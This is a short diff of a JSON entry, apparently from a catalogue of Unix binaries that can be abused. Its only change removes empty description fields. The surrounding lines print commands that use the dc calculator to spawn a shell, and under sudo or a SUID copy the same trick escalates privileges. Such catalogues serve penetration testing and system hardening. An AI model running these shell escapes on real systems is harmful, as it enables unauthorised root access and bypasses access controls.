@@ -2,19 +2,19 @@
   "functions": {
     "shell": [
       {
-        "description": "",
+        
         "code": "dc -e '!/bin/sh'\n"
       }
     ],
     "sudo": [
       {
-        "description": "",
+        
         "code": "sudo dc -e '!/bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "description": "",
+        
         "code": "./dc -e '!/bin/sh'\n"
       }
     ]
